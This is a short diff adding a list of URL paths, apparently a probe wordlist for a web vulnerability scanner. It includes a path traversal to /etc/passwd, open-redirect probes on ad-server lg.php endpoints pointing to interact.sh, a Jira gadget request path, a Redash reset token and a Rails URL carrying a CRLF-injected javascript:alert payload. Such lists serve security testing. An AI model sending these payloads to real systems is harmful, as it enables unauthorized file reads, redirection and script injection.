@@ -1,0 +1,17 @@
+/{{randstr}}
+/node_modules/../../../../../etc/passwd
+/plugins/servlet/gadgets/makeRequest
+/www/delivery/afr.php?refresh=10000&\
+/ads/www/delivery/lg.php?dest=http://interact.sh
+/adserve/www/delivery/lg.php?dest=http://interact.sh
+/adserver/www/delivery/lg.php?dest=http://interact.sh
+/openx/www/delivery/lg.php?dest=http://interact.sh
+/revive/www/delivery/lg.php?dest=http://interact.sh
+/www/delivery/lg.php?dest=http://interact.sh
+/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs
+/redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs
+/wp-json/wp/v2/sensei-messages/{{num}}
+/_vti_bin/lists.asmx?WSDL
+/metrics
+/api/metrics
+/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
